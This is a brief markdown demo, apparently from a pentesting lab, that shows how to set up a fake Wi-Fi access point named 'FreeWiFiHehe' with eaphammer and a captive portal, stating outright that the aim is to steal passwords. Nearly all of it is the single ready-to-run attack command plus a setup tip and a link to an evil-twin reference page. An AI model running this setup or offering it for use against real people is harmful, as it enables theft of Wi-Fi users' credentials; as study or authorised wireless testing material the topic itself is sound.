# Fake

In this simple Demo we are deploying a FakeAP with `eaphammer` with a captive portal to steal passwords

> Make sure Port 80 is avaiable and the interface wlan0 is NOT in monitor mode

```bash
sudo eaphammer -i wlan0 --essid FreeWiFiHehe --captive-portal
```


## References
- https://book.hacktricks.wiki/en/generic-methodologies-and-resources/pentesting-wifi/index.html#evil-twin